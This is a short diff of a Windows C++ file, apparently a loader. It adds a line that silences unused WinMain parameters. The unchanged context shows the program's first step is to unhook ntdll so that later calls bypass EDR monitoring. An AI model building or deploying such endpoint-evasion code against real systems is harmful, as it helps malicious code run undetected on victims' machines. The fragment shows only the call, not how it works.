@@ -6,6 +6,7 @@
 #include <objbase.h>
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
     // 1. Evasion: Unhook ntdll immediately to bypass EDR hooks on subsequent calls
     evasion::Unhooker::RefreshNtdll();
     
